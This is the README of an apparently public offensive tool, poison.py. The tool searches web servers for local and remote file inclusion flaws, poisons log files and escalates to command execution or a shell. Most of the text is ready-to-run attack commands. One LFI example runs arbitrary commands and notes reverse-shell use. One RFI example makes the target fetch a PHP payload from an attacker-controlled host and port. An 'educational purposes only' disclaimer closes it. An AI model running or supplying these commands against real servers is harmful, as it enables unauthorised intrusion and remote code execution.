# poison.py
Fast tool to search accessible log's files for LFI/RFI vulnerabilities written on python3, automatic escalation to RCE/Shell.

*(all the wordlists and payloads is included)*

## Installation:
```
git clone https://github.com/coldt3ars/poison
cd poison
pip install -r requirements.txt
python3 poison.py
```
# Exploitation
## Example usage (LFI):
![LFI](https://github.com/user-attachments/assets/bd3a864f-03ea-42dd-a5f5-8d10e803cf33)

```
./poison.py -u 'http://localhost/index.php?page=/etc/passwd' -e 'id' -w src/small.txt -p src/payloads.txt
```
_____________________________________________________________________________________________
```
-u 'http://localhost/index.php?page=/etc/passwd' # URL for poison the log
```

```
-e 'id' # Command to execute (In this time, command is id) (this option can be used for rev. shell)
```

```
-w src/small.txt # wordlist using the search for available log's file
```

```
-p src/payloads.txt # list of paylods during the poisoning
```

## Example usage (RFI):
![RFI](https://github.com/user-attachments/assets/1d6b7044-5ae5-4a44-aa94-33f3513d49a2)
```
./poison.py -u 'http://localhost/index.php?page=/etc/passwd' -w src/big.txt -p src/payloads.txt --rfi --lfile src/script.php --lhost 127.0.0.1 --lport 12345 -e ''
```
_____________________________________________________________________________________________
```
--rfi # Remote File Inclusion option
```

```
--lhost 127.0.0.1 # remote-ip-address of http-server in request during the RFI
```

```
--lport 12345 # remote-port of http-server in request during the RFI
```

```
--lfile 'src/script.php' # payload which include in the request during the RFI
```

```
-e '' # no-op function
```

# ToDo list:
-   [x] Add the function with command execution
-   [x] Add the support of wordlist's
-   [ ] Add different injection endpoints (Headers)
-   [ ] Interactive shell 
-   [X] Add the function for RFI

# FOR EDUCATIONAL PURPOSES ONLY!
Usage of poison.py for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Author assume no liability and are not responsible for any misuse or damage caused by this program
